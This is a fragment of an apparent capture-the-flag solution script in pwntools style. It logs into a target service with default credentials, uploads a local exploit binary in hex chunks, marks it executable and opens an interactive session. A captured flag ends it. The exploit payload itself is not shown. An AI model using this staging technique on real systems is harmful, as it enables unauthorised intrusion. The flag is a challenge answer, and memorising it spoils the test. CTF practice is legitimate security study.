...
sla(b'User', b'user')
sla(b'Password', b'user')

d=open('exploit2.bin','rb').read().hex()
for i in range(0,len(d),500):
    cmd = f'upload /home/user/exploit {i//2} {d[i:i+500]}'
    sl(cmd.encode())
    print(cl(timeout=0.5))

sl(b'chmod 755 /home/user/exploit')

ia()


# ecsc26{d3finit3ly_n33d5_s0me_mor3_P0lish1ng!!1_:flag_pl:}